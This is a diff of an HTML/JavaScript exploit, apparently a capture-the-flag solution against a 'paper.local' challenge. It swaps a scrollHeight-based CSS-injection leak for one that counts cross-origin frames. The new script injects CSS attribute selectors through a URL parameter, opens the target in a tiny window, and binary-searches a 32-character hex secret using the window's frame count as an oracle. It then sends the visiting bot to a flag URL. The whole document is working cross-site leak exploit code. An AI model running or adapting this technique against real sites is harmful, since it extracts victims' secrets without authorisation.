@@ -1,61 +1,71 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <div id="status">Status: Initializing...</div>
-    <script>
-        const TARGET = "https://paper.local/secret?payload=";
-        const ALPHABET = "0123456789abcdef".split("");
-        let secret = "";
+<script>
+  // The internal address the bot visits
+  const TARGET = "https://paper.local"; 
+  const ALPHABET = "0123456789abcdef";
 
-        async function leakChar(char) {
-            const guess = secret + char;
-            // This CSS forces a scrollbar to appear ONLY if the guess is right
-            const payload = `
-                <style>
-                    body[secret^="${guess}"] #leak { height: 5000px; display: block; }
-                    #leak { display: none; }
-                </style>
-                <div id="leak"></div>
-            `;
+  function sleep(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
 
-            return new Promise((resolve) => {
-                const win = window.open(TARGET + encodeURIComponent(payload), "_blank");
-                
-                let check = setInterval(() => {
-                    try {
-                        // We check if the scrollHeight of the new window increased
-                        if (win.document.body.scrollHeight > 1000) {
-                            clearInterval(check);
-                            win.close();
-                            resolve(true);
-                        }
-                    } catch(e) { /* waiting for load */ }
-                }, 50);
+  async function test(prefix, characters) {
+    // CSS selector that hides an object if the secret matches our guess
+    const selectors = characters.split("")
+      .map(c => `body[secret^="${prefix + c}"] object#leak`)
+      .join(",");
 
-                // Timeout after 1 second if no match
-                setTimeout(() => { 
-                    clearInterval(check); 
-                    if (!win.closed) win.close(); 
-                    resolve(false); 
-                }, 1000);
-            });
+    const payload = `
+      <style>
+        ${selectors} { display: none; }
+      </style>
+      <object id="leak" data="about:blank"></object>
+      <object data="about:blank"></object>
+    `;
+
+    return new Promise((resolve) => {
+      const url = TARGET + "/secret?" + new URLSearchParams({ payload });
+      // We open the target page in a new window/tab
+      const w = window.open(url, "_blank", "width=1,height=1");
+      
+      const interval = setInterval(() => {
+        try {
+          if (w && w.length > 0) {
+            clearInterval(interval);
+            setTimeout(() => {
+              // If match, one object is hidden (length=1). Otherwise, length=2.
+              const matched = (w.length === 1);
+              w.close();
+              resolve(matched);
+            }, 100);
+          }
+        } catch(e) { /* waiting for load */ }
+      }, 50);
+    });
+  }
+
+  async function solve() {
+    let currentSecret = "";
+    // Secret is 32 hex characters long
+    for (let i = 0; i < 32; i++) {
+      let low = 0, high = ALPHABET.length - 1;
+      while (low <= high) {
+        if (low === high) {
+          currentSecret += ALPHABET[low];
+          console.log("Found char:", currentSecret);
+          break;
         }
-
-        async function start() {
-            for (let i = 0; i < 32; i++) {
-                for (let c of ALPHABET) {
-                    document.getElementById('status').innerText = `Testing: ${secret}${c}`;
-                    if (await leakChar(c)) {
-                        secret += c;
-                        break;
-                    }
-                }
-            }
-            // Once found, go to the flag
-            location.href = `https://paper.local/flag?secret=${secret}`;
+        let mid = Math.floor((low + high) / 2);
+        let range = ALPHABET.slice(low, mid + 1);
+        
+        if (await test(currentSecret, range)) {
+          high = mid;
+        } else {
+          low = mid + 1;
         }
+      }
+    }
+    // After finding the full secret, redirect the bot to claim the flag
+    location.href = `${TARGET}/flag?secret=${currentSecret}`;
+  }
 
-        start();
-    </script>
-</body>
-</html>
+  solve();
+</script>
